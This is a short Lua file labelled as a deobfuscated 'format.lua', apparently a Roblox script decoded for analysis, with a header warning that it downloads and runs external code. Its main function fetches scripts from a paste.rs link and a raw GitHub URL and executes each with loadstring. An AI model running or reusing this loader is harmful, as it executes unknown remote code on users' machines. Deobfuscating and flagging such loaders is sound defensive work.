
-- Deobfuscated version of format.lua
-- WARNING: This script downloads and executes external code

local function httpGet(url)
    -- This function would make HTTP requests to the given URL
    -- Implementation depends on the Lua HTTP library being used
    local game = game or {} -- Roblox game object
    if game.HttpGet then
        return game:HttpGet(url)
    else
        -- Fallback for other Lua environments
        print("HTTP request to: " .. url)
        return ""
    end
end

-- Main execution
local function main()
    local game = game or {}
    
    -- First HTTP request to rubis.app API
    local url1 = "https://paste.rs/PBqAc"
    local response1 = httpGet(url1)
    
    if response1 and response1 ~= "" then
        -- Load and execute the downloaded script
        local func1 = loadstring(response1)
        if func1 then
            func1()
        end
    end
    
    -- Second HTTP request to GitHub
    local url2 = "https://raw.githubusercontent.com/Nemesis-lag/Age/refs/heads/main/50"
    local response2 = httpGet(url2)
    
    if response2 and response2 ~= "" then
        -- Load and execute the downloaded script
        local func2 = loadstring(response2)
        if func2 then
            func2()
        end
    end
end

-- Execute main function
main()
